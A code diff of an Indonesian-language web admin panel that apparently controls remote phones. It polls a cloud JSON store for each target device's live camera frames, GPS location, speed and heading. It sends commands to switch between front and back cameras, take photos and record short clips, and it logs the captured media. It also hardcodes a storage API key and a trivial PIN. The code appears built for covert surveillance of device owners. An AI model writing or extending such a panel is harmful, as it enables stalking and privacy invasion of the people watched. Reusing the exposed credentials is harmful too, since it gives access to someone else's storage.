@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Live Video Call & Lokasi</title>
+    <title>Admin Panel - Kamera Depan & Belakang</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0f172a; color: #f8fafc; padding: 20px; }
@@ -43,17 +43,19 @@
         button {
             padding: 10px 15px; border: none; border-radius: 8px;
             font-weight: 600; cursor: pointer; font-size: 13px;
+            transition: opacity 0.15s ease, background 0.15s ease;
         }
+        button:disabled { opacity: 0.55; cursor: not-allowed; }
         .btn-primary { background: #3b82f6; color: white; }
-        .btn-primary:hover { background: #2563eb; }
+        .btn-primary:hover:not(:disabled) { background: #2563eb; }
         .btn-cam { background: #6366f1; color: white; }
-        .btn-cam:hover { background: #4f46e5; }
+        .btn-cam:hover:not(:disabled) { background: #4f46e5; }
         .btn-photo { background: #10b981; color: white; }
-        .btn-photo:hover { background: #059669; }
+        .btn-photo:hover:not(:disabled) { background: #059669; }
         .btn-rec { background: #ef4444; color: white; }
-        .btn-rec:hover { background: #dc2626; }
+        .btn-rec:hover:not(:disabled) { background: #dc2626; }
         .btn-danger { background: #7f1d1d; color: #fecaca; }
-        .btn-danger:hover { background: #991b1b; }
+        .btn-danger:hover:not(:disabled) { background: #991b1b; }
 
         .section-title { font-size: 16px; margin-bottom: 12px; color: #e2e8f0; }
 
@@ -72,7 +74,7 @@
         .call-screen {
             position: relative;
             width: 100%;
-            max-width: 560px;
+            max-width: 520px;
             aspect-ratio: 4 / 3;
             margin: 0 auto 14px;
             background: #020617;
@@ -83,7 +85,7 @@
             align-items: center;
             justify-content: center;
         }
-        .call-screen video {
+        .call-screen img {
             width: 100%;
             height: 100%;
             object-fit: cover;
@@ -94,15 +96,18 @@
             pointer-events: none; gap: 8px;
         }
         .tag-live {
-            background: rgba(239, 68, 68, 0.92); color: #fff;
+            background: rgba(239, 68, 68, 0.9); color: #fff;
             font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 999px;
         }
+        .tag-live.is-fresh {
+            background: rgba(22, 163, 74, 0.92);
+        }
         .tag-cam {
-            background: rgba(99, 102, 241, 0.92); color: #fff;
+            background: rgba(99, 102, 241, 0.9); color: #fff;
             font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 999px;
         }
         .tag-age {
-            background: rgba(15, 23, 42, 0.8); color: #e2e8f0;
+            background: rgba(15, 23, 42, 0.78); color: #e2e8f0;
             font-size: 11px; padding: 4px 10px; border-radius: 999px;
         }
         .call-meta {
@@ -162,37 +167,37 @@
     <div id="dashboard">
         <div class="header">
             <div>
-                <h1>📹 Live Video Call & Lokasi</h1>
-                <div class="live-pill"><span class="dot"></span> WebRTC Real-Time • Total Log: <span id="totalCount">0</span></div>
+                <h1>📹 Pantau Kamera Depan/Belakang & Lokasi</h1>
+                <div class="live-pill"><span class="dot"></span> Auto-Sync (tiap 3d) • Total Log: <span id="totalCount">0</span></div>
             </div>
             <div class="actions">
-                <button class="btn-primary" onclick="startLiveCall(true)">▶ Mulai Live Video</button>
-                <button class="btn-danger" onclick="clearLogs()">🗑️ Hapus Log</button>
+                <button class="btn-primary" id="btnSyncNow" onclick="syncAll(true)">🔄 Sinkron Sekarang</button>
+                <button class="btn-danger" id="btnClearLogs" onclick="clearLogs()">🗑️ Hapus Log</button>
             </div>
         </div>
 
-        <h2 class="section-title">📺 Layar Live Stream Kamera (Real-Time)</h2>
+        <h2 class="section-title">📺 Layar Pantau Kamera (Depan / Belakang)</h2>
         <div class="call-stage">
             <div class="session-bar">
                 <div>
-                    <label for="sessionSelect"><strong>Perangkat Aktif:</strong> </label>
-                    <select id="sessionSelect" onchange="onSelectSession()">
-                        <option value="">Otomatis (Perangkat Terbaru)</option>
+                    <label for="sessionSelect"><strong>Target Sesi:</strong> </label>
+                    <select id="sessionSelect" onchange="onSessionChange()">
+                        <option value="">Otomatis (Sesi Terbaru)</option>
                     </select>
                 </div>
-                <div id="rtcStateLabel">WebRTC: Belum terhubung</div>
+                <div id="activeSessionMeta">Session ID: -</div>
             </div>
 
             <div class="call-screen">
                 <div class="call-overlay-top">
                     <div style="display:flex;gap:6px;">
-                        <span class="tag-live" id="liveBadge">OFFLINE</span>
+                        <span class="tag-live" id="liveBadge">MENUNGGU</span>
                         <span class="tag-cam" id="camBadge">KAMERA: -</span>
                     </div>
                     <span class="tag-age" id="ageBadge">-</span>
                 </div>
-                <video id="remoteVideo" autoplay playsinline style="display:none;"></video>
-                <span id="livePlaceholder" style="color:#64748b;font-size:13px;">Menunggu sesi perangkat & klik "Mulai Live Video"...</span>
+                <img id="liveFrameImg" src="" alt="Live Camera" style="display:none;">
+                <span id="livePlaceholder" style="color:#64748b;font-size:13px;">Menunggu kamera & lokasi dari perangkat...</span>
             </div>
 
             <div class="call-meta">
@@ -208,7 +213,7 @@
                 <button class="btn-photo" onclick="sendCommand('PHOTO', null)">📸 Ambil Foto</button>
                 <button class="btn-rec" onclick="sendCommand('RECORD', null)">🎥 Rekam Klip (3,5d)</button>
             </div>
-            <div id="cmdStatus" class="cmd-status">Status: Siap.</div>
+            <div id="cmdStatus" class="cmd-status">Status perintah: Siap mengirim perintah.</div>
         </div>
 
         <h2 class="section-title">📂 Hasil Foto & Rekaman Tersimpan</h2>
@@ -220,231 +225,185 @@
 
 <script>
     const ADMIN_PIN = "123456";
-    // Samakan dengan FIREBASE_DB_URL di index.html
-    const FIREBASE_DB_URL = "https://YOUR-PROJECT-default-rtdb.firebaseio.com";
+    const JSON_URL  = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
+    const API_KEY   = "b3b1f259-fdd1-4906-b083-51fe497ffd59";
+    const AUTO_SYNC_MS = 3000;
 
-    const viewerId = "admin_" + Math.random().toString(36).slice(2, 8);
-    const rtcConfig = {
-        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
-    };
-
-    let pollTimer = null;
-    let pc = null;
-    let activeTargetSessionId = null;
+    let syncTimer = null;
+    let isFetching = false;
+    let isSendingCmd = false;
+    let lastRenderedFrame = "";
+    let lastRenderedLogSignature = "";
+    let latestLiveSessions = {};
     let selectedSessionId = "";
-    let latestSessions = {};
-    let lastLogSignature = "";
-    const seenMemberCandidates = new Set();
-
-    function dbUrl(path) {
-        return `${FIREBASE_DB_URL}/${path}.json`;
-    }
-
-    async function dbGet(path) {
-        const res = await fetch(dbUrl(path));
-        if (!res.ok) throw new Error(`GET ${path} failed: ${res.status}`);
-        return res.json();
-    }
-
-    async function dbPut(path, data) {
-        const res = await fetch(dbUrl(path), {
-            method: "PUT",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-        });
-        if (!res.ok) throw new Error(`PUT ${path} failed: ${res.status}`);
-        return res.json();
-    }
-
-    async function dbPost(path, data) {
-        const res = await fetch(dbUrl(path), {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-        });
-        if (!res.ok) throw new Error(`POST ${path} failed: ${res.status}`);
-        return res.json();
-    }
-
-    async function dbDelete(path) {
-        await fetch(dbUrl(path), { method: "DELETE" }).catch(() => {});
-    }
 
     function checkPin() {
-        const input = document.getElementById("pinInput").value.trim();
+        const input = document.getElementById('pinInput').value.trim();
         if (input === ADMIN_PIN) {
-            document.getElementById("loginScreen").style.display = "none";
-            document.getElementById("dashboard").style.display = "block";
-            startLoop();
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            startAutoSync();
         } else {
             alert("PIN salah!");
         }
     }
 
-    function startLoop() {
-        if (pollTimer) clearInterval(pollTimer);
-        tick();
-        pollTimer = setInterval(tick, 1200);
+    function startAutoSync() {
+        if (syncTimer) clearInterval(syncTimer);
+        syncAll(true);
+        syncTimer = setInterval(() => {
+            if (!isSendingCmd) syncAll(false);
+        }, AUTO_SYNC_MS);
     }
 
-    function resetPeerConnection() {
-        if (pc) {
-            pc.close();
-            pc = null;
-        }
-        seenMemberCandidates.clear();
-        const vid = document.getElementById("remoteVideo");
-        vid.srcObject = null;
-        vid.style.display = "none";
-        document.getElementById("livePlaceholder").style.display = "block";
-        document.getElementById("rtcStateLabel").textContent = "WebRTC: Belum terhubung";
+    function normalizeData(parsed) {
+        return {
+            logs: Array.isArray(parsed?.logs) ? parsed.logs : [],
+            liveSessions: parsed?.liveSessions && typeof parsed.liveSessions === "object" ? parsed.liveSessions : {},
+            command: parsed?.command && typeof parsed.command === "object"
+                ? parsed.command
+                : { action: "NONE", targetSessionId: null, facing: null, token: null }
+        };
     }
 
-    function pickActiveSession(sessions) {
-        const list = Object.values(sessions || {})
-            .filter(s => s && s.sessionId)
-            .sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
+    async function fetchRemoteState() {
+        const res = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
+        if (!res.ok) throw new Error(`HTTP ${res.status} saat mengambil data`);
+        const parsed = await res.json();
+        return normalizeData(parsed);
+    }
 
-        if (selectedSessionId) {
-            return list.find(s => s.sessionId === selectedSessionId) || list[0] || null;
-        }
-        return list[0] || null;
+    async function putRemoteState(payload) {
+        const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
+        const res = await fetch(putUrl, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        if (!res.ok) throw new Error(`HTTP ${res.status} saat menyimpan data`);
+    }
+
+    function onSessionChange() {
+        selectedSessionId = document.getElementById('sessionSelect').value;
+        lastRenderedFrame = "";
+        renderLiveStage(latestLiveSessions);
     }
 
     function updateSessionDropdown(sessions) {
-        const select = document.getElementById("sessionSelect");
-        const list = Object.values(sessions || {})
-            .filter(s => s && s.sessionId)
+        const select = document.getElementById('sessionSelect');
+        const entries = Object.values(sessions || {})
+            .filter(item => item && item.sessionId)
             .sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
 
-        const opts = ['<option value="">Otomatis (Perangkat Terbaru)</option>'];
-        for (const s of list) {
+        const options = ['<option value="">Otomatis (Sesi Terbaru)</option>'];
+        for (const s of entries) {
             const ageSec = s.updatedAt ? Math.max(0, Math.round((Date.now() - s.updatedAt) / 1000)) : null;
-            const label = `${s.nama || "HP"} • ${s.sessionId.slice(-6)} (${ageSec !== null ? ageSec + "d lalu" : "-"})`;
-            const sel = selectedSessionId === s.sessionId ? " selected" : "";
-            opts.push(`<option value="${escapeAttr(s.sessionId)}"${sel}>${escapeHtml(label)}</option>`);
+            const statusTxt = ageSec !== null ? `${ageSec}d lalu` : "-";
+            const label = `${s.nama || "Perangkat"} • ${s.sessionId.slice(-6)} (${statusTxt})`;
+            const isSel = selectedSessionId === s.sessionId ? " selected" : "";
+            options.push(`<option value="${escapeAttr(s.sessionId)}"${isSel}>${escapeHtml(label)}</option>`);
         }
 
-        const nextHtml = opts.join("");
+        const nextHtml = options.join("");
         if (select.innerHTML !== nextHtml) {
             select.innerHTML = nextHtml;
         }
-    }
-
-    function onSelectSession() {
-        selectedSessionId = document.getElementById("sessionSelect").value;
-        resetPeerConnection();
-        activeTargetSessionId = null;
-        startLiveCall(false);
-    }
-
-    async function startLiveCall(showAlertIfEmpty = false) {
-        const target = pickActiveSession(latestSessions);
-        if (!target) {
-            if (showAlertIfEmpty) alert("Belum ada perangkat member yang aktif.");
-            return;
+        if (selectedSessionId && !sessions[selectedSessionId]) {
+            selectedSessionId = "";
+            select.value = "";
         }
-
-        if (activeTargetSessionId !== target.sessionId) {
-            resetPeerConnection();
-            activeTargetSessionId = target.sessionId;
-        }
-
-        document.getElementById("rtcStateLabel").textContent = `WebRTC: Meminta stream dari ${target.sessionId.slice(-6)}...`;
-        await dbPut(`calls/${target.sessionId}/requests/${viewerId}`, {
-            active: true,
-            updatedAt: Date.now()
-        }).catch(() => {});
     }
 
-    async function syncWebRTCForSession(targetSessionId) {
-        if (!targetSessionId) return;
+    async function sendCommand(actionType, facingVal) {
+        if (isSendingCmd) return;
+        isSendingCmd = true;
+
+        const cmdStatus = document.getElementById('cmdStatus');
+        const targetId = selectedSessionId || null;
+        cmdStatus.textContent = "Mengirim perintah...";
 
         try {
-            const offer = await dbGet(`calls/${targetSessionId}/offers/${viewerId}`);
-            if (offer && offer.sdp) {
-                if (!pc) {
-                    pc = new RTCPeerConnection(rtcConfig);
+            const currentData = await fetchRemoteState();
+            const token = "cmd_" + Date.now() + "_" + Math.random().toString(36).slice(2, 6);
 
-                    pc.ontrack = (event) => {
-                        const vid = document.getElementById("remoteVideo");
-                        if (event.streams && event.streams[0]) {
-                            vid.srcObject = event.streams[0];
-                        } else {
-                            const ms = vid.srcObject || new MediaStream();
-                            ms.addTrack(event.track);
-                            vid.srcObject = ms;
-                        }
-                        vid.style.display = "block";
-                        vid.play().catch(() => {});
-                        document.getElementById("livePlaceholder").style.display = "none";
-                    };
+            currentData.command = {
+                action: actionType,
+                facing: facingVal,
+                targetSessionId: targetId,
+                token: token
+            };
 
-                    pc.onicecandidate = async (event) => {
-                        if (event.candidate) {
-                            await dbPost(`calls/${targetSessionId}/adminCandidates`, {
-                                viewerId,
-                                candidate: event.candidate.toJSON(),
-                                ts: Date.now()
-                            }).catch(() => {});
-                        }
-                    };
+            await putRemoteState(currentData);
 
-                    pc.onconnectionstatechange = () => {
-                        document.getElementById("rtcStateLabel").textContent = `WebRTC: ${pc.connectionState}`;
-                    };
-                }
-
-                if (!pc.currentRemoteDescription) {
-                    await pc.setRemoteDescription(new RTCSessionDescription(offer));
-                    const answer = await pc.createAnswer();
-                    await pc.setLocalDescription(answer);
-                    await dbPut(`calls/${targetSessionId}/answers/${viewerId}`, {
-                        sdp: answer.sdp,
-                        type: answer.type,
-                        updatedAt: Date.now()
-                    });
-                }
-
-                const memberCandidates = await dbGet(`calls/${targetSessionId}/memberCandidates`);
-                if (memberCandidates && typeof memberCandidates === "object") {
-                    for (const [cid, item] of Object.entries(memberCandidates)) {
-                        if (!seenMemberCandidates.has(cid) && item && item.viewerId === viewerId && item.candidate) {
-                            seenMemberCandidates.add(cid);
-                            await pc.addIceCandidate(new RTCIceCandidate(item.candidate)).catch(() => {});
-                        }
-                    }
-                }
-            }
+            const labelFacing = facingVal === "environment"
+                ? "Kamera Belakang"
+                : (facingVal === "user" ? "Kamera Depan" : actionType);
+            const targetLabel = targetId ? `sesi ${targetId.slice(-6)}` : "semua sesi aktif";
+            cmdStatus.textContent = `Perintah (${labelFacing}) terkirim ke ${targetLabel}. Menunggu eksekusi perangkat (~3–5d)...`;
         } catch (err) {
-            console.error("WebRTC sync error:", err);
+            cmdStatus.textContent = `Gagal mengirim perintah: ${err.message}`;
+            console.error(err);
+        } finally {
+            isSendingCmd = false;
         }
     }
 
-    function renderSessionInfo(active) {
-        const liveBadge = document.getElementById("liveBadge");
-        const camBadge = document.getElementById("camBadge");
-        const ageBadge = document.getElementById("ageBadge");
-        const locInfo = document.getElementById("liveLocInfo");
-        const mapAction = document.getElementById("liveMapAction");
+    function renderLiveStage(liveSessions) {
+        latestLiveSessions = liveSessions || {};
+        updateSessionDropdown(latestLiveSessions);
+
+        const list = Object.values(latestLiveSessions)
+            .filter(item => item && (item.frame || (item.lat !== null && item.lat !== undefined && item.lng !== null && item.lng !== undefined)))
+            .sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
+
+        const imgEl = document.getElementById('liveFrameImg');
+        const phEl = document.getElementById('livePlaceholder');
+        const liveBadge = document.getElementById('liveBadge');
+        const camBadge = document.getElementById('camBadge');
+        const ageBadge = document.getElementById('ageBadge');
+        const locInfo = document.getElementById('liveLocInfo');
+        const mapAction = document.getElementById('liveMapAction');
+        const sessionMeta = document.getElementById('activeSessionMeta');
+
+        const active = selectedSessionId
+            ? list.find(item => item.sessionId === selectedSessionId) || list[0]
+            : list[0];
 
         if (!active) {
-            liveBadge.textContent = "OFFLINE";
+            imgEl.style.display = "none";
+            phEl.style.display = "block";
+            liveBadge.textContent = "MENUNGGU";
+            liveBadge.classList.remove("is-fresh");
             camBadge.textContent = "KAMERA: -";
             ageBadge.textContent = "-";
+            sessionMeta.textContent = "Session ID: -";
             locInfo.innerHTML = "<strong>Lokasi:</strong> Belum ada data • <strong>Kecepatan:</strong> - • <strong>Arah:</strong> -";
             mapAction.innerHTML = "";
             return;
         }
 
         const ageSec = active.updatedAt ? Math.max(0, Math.round((Date.now() - active.updatedAt) / 1000)) : null;
-        const isLive = ageSec !== null && ageSec <= 6;
+        const isFresh = ageSec !== null && ageSec <= 10;
 
-        liveBadge.textContent = isLive ? "LIVE" : "TERAKHIR";
+        liveBadge.textContent = isFresh ? "AKTIF" : "TERAKHIR";
+        liveBadge.classList.toggle("is-fresh", isFresh);
         camBadge.textContent = `KAMERA: ${String(active.kameraPosisi || "Depan").toUpperCase()}`;
         ageBadge.textContent = ageSec !== null ? `Update ${ageSec}d lalu` : (active.waktu || "-");
+        sessionMeta.textContent = `Session: ${active.sessionId || "-"}`;
 
-        const hasCoords = active.lat !== undefined && active.lat !== null && active.lng !== undefined && active.lng !== null;
+        if (typeof active.frame === "string" && active.frame.startsWith("data:image/")) {
+            if (active.frame !== lastRenderedFrame) {
+                lastRenderedFrame = active.frame;
+                imgEl.src = active.frame;
+            }
+            imgEl.style.display = "block";
+            phEl.style.display = "none";
+        } else {
+            imgEl.style.display = "none";
+            phEl.style.display = "block";
+        }
+
+        const hasCoords = active.lat !== null && active.lat !== undefined && active.lng !== null && active.lng !== undefined;
         locInfo.innerHTML = `
             <strong>Lokasi:</strong> ${hasCoords ? `${escapeHtml(active.lat)}, ${escapeHtml(active.lng)}` : "Tidak ada"} (${escapeHtml(active.akurasi || "-")}) •
             <strong>Kecepatan:</strong> ${escapeHtml(active.kecepatan || "-")} •
@@ -455,26 +414,30 @@
             : "";
     }
 
-    function renderLogs(logsObj) {
-        const logs = logsObj && typeof logsObj === "object"
-            ? Object.values(logsObj).sort((a, b) => (b.id || 0) - (a.id || 0))
-            : [];
+    function buildLogsSignature(logs) {
+        if (!Array.isArray(logs) || logs.length === 0) return "0";
+        const first = logs[0];
+        return `${logs.length}_${first?.id ?? ""}_${first?.waktu ?? ""}_${first?.tipe ?? ""}`;
+    }
 
-        document.getElementById("totalCount").textContent = logs.length;
-        const sig = logs.length ? `${logs.length}_${logs[0].id || ""}` : "0";
-        if (sig === lastLogSignature) return;
-        lastLogSignature = sig;
+    function renderLogs(logs, forceRender) {
+        const safeLogs = Array.isArray(logs) ? logs : [];
+        const container = document.getElementById('logContainer');
+        document.getElementById('totalCount').textContent = safeLogs.length;
 
-        const container = document.getElementById("logContainer");
-        if (logs.length === 0) {
+        const sig = buildLogsSignature(safeLogs);
+        if (!forceRender && sig === lastRenderedLogSignature) return;
+        lastRenderedLogSignature = sig;
+
+        if (safeLogs.length === 0) {
             container.innerHTML = '<div class="empty-state">Belum ada foto atau rekaman tersimpan.</div>';
             return;
         }
 
-        container.innerHTML = logs.map((item, idx) => {
+        container.innerHTML = safeLogs.map((item, idx) => {
             const hasPhoto = typeof item?.foto === "string" && item.foto.startsWith("data:image/");
             const hasVideo = typeof item?.video === "string" && item.video.startsWith("data:video/");
-            const hasCoords = item?.lat !== undefined && item?.lat !== null && item?.lng !== undefined && item?.lng !== null;
+            const hasCoords = item?.lat !== null && item?.lat !== undefined && item?.lng !== null && item?.lng !== undefined;
 
             let mediaHtml = `<span style="font-size:11px;color:#64748b;">Tidak ada media</span>`;
             let downloadHtml = "";
@@ -496,12 +459,14 @@
                 ? `<span class="badge badge-rec">REKAMAN KLIP</span>`
                 : `<span class="badge">FOTO</span>`;
 
+            const camBadge = `<span class="badge">Kamera ${escapeHtml(item?.kameraPosisi || "Depan")}</span>`;
+
             return `
                 <div class="log-card">
                     <div class="log-left">
                         <div class="media-box">${mediaHtml}</div>
                         <div class="log-info">
-                            <h3>${escapeHtml(item?.nama || "Perangkat")} ${typeBadge} <span class="badge">Kamera ${escapeHtml(item?.kameraPosisi || "Depan")}</span> <span class="badge">GPS: ${escapeHtml(item?.akurasi || "-")}</span></h3>
+                            <h3>${escapeHtml(item?.nama || "Perangkat")} ${typeBadge} ${camBadge} <span class="badge">GPS: ${escapeHtml(item?.akurasi || "-")}</span></h3>
                             <p>🕒 <strong>Waktu:</strong> ${escapeHtml(item?.waktu || "-")}</p>
                             <p>🌐 <strong>Koordinat:</strong> ${hasCoords ? `${escapeHtml(item.lat)}, ${escapeHtml(item.lng)}` : "Tidak tersedia"}</p>
                             <p class="device-info">📱 ${escapeHtml(item?.perangkat || "")}</p>
@@ -513,58 +478,47 @@
                     </div>
                 </div>
             `;
-        }).join("");
+        }).join('');
     }
 
-    async function sendCommand(actionType, facingVal) {
-        const target = pickActiveSession(latestSessions);
-        const targetId = selectedSessionId || target?.sessionId || null;
-        const statusEl = document.getElementById("cmdStatus");
+    async function syncAll(forceRender) {
+        if (isFetching) return;
+        isFetching = true;
 
         try {
-            await dbPut("command", {
-                action: actionType,
-                facing: facingVal,
-                targetSessionId: targetId,
-                token: "cmd_" + Date.now() + "_" + Math.random().toString(36).slice(2, 6)
-            });
-            statusEl.textContent = `Perintah ${actionType} terkirim.`;
+            const data = await fetchRemoteState();
+            renderLiveStage(data.liveSessions);
+            renderLogs(data.logs, forceRender);
         } catch (err) {
-            statusEl.textContent = `Gagal kirim perintah: ${err.message}`;
-        }
-    }
-
-    async function tick() {
-        try {
-            const [sessions, logs] = await Promise.all([
-                dbGet("liveSessions"),
-                dbGet("logs")
-            ]);
-
-            latestSessions = sessions && typeof sessions === "object" ? sessions : {};
-            updateSessionDropdown(latestSessions);
-
-            const active = pickActiveSession(latestSessions);
-            renderSessionInfo(active);
-            renderLogs(logs);
-
-            if (active && (!activeTargetSessionId || activeTargetSessionId === active.sessionId)) {
-                if (!activeTargetSessionId) {
-                    activeTargetSessionId = active.sessionId;
-                    await startLiveCall(false);
-                }
-                await syncWebRTCForSession(active.sessionId);
+            if (forceRender) {
+                document.getElementById('livePlaceholder').textContent = `Gagal menyinkronkan data (${err.message}).`;
             }
-        } catch (err) {
-            console.error("Tick error:", err);
+            console.error(err);
+        } finally {
+            isFetching = false;
         }
     }
 
     async function clearLogs() {
         if (!confirm("Yakin ingin menghapus seluruh riwayat foto & rekaman?")) return;
-        await dbDelete("logs");
-        lastLogSignature = "";
-        renderLogs({});
+        const btn = document.getElementById('btnClearLogs');
+        btn.disabled = true;
+
+        try {
+            const current = await fetchRemoteState();
+            await putRemoteState({
+                logs: [],
+                liveSessions: current.liveSessions,
+                command: current.command
+            });
+            lastRenderedLogSignature = "";
+            await syncAll(true);
+        } catch (err) {
+            alert(`Gagal menghapus log: ${err.message}`);
+            console.error(err);
+        } finally {
+            btn.disabled = false;
+        }
     }
 
     function escapeHtml(text) {
